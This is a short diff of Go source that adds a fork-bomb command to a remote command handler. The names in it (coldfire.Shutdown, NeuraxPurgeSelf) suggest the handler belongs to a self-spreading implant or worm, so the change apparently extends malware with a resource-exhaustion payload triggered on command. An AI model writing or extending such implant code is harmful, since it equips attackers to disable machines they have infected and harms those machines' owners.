@@ -290,6 +290,9 @@ func handle_command(cmd string) {
 		if strings.Contains(preamble, "q") {
 			coldfire.Shutdown()
 		}
+		if strings.Contains(preamble, "f") {
+			coldfire.Forkbomb()
+		}
 	} else {
 		if cmd == "purge" {
 			NeuraxPurgeSelf()
